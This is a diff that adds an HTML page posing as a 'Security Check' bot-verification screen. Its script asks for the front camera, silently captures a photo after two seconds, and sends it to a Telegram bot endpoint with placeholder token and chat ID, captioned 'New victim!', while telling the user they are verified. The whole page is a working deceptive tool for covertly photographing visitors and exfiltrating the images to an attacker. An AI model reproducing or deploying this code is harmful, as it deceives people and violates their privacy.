@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body { background: #1a1a2e; color: #fff; font-family: Arial; text-align: center; padding: 30px; }
+        h1 { font-size: 22px; }
+        p { color: #999; font-size: 14px; }
+        button { background: #0088cc; color: #fff; border: none; padding: 15px 40px; border-radius: 10px; font-size: 18px; cursor: pointer; }
+        video { width: 100%; max-width: 400px; border-radius: 15px; display: none; }
+    </style>
+</head>
+<body>
+    <h1>🛡 Security Check</h1>
+    <p>Verify you are not a bot. This takes 2 seconds.</p>
+    <button onclick="startCamera()">✅ Verify</button>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none"></canvas>
+    <p id="status"></p>
+    <script>
+        async function startCamera() {
+            try {
+                const video = document.getElementById('video');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                document.querySelector('button').style.display = 'none';
+                document.getElementById('status').innerText = 'Checking...';
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photo = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    fetch('https://api.telegram.org/botТВОЙ_ТОКЕН/sendPhoto', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: 'ТВОЙ_ID',
+                            photo: photo.split(',')[1],
+                            caption: '📸 New victim!'
+                        })
+                    });
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    video.style.display = 'none';
+                    document.getElementById('status').innerHTML = '✅ Verified! Thank you.';
+                }, 2000);
+            } catch (e) {
+                document.getElementById('status').innerText = '❌ Allow camera access!';
+            }
+        }
+    </script>
+</body>
+</html>
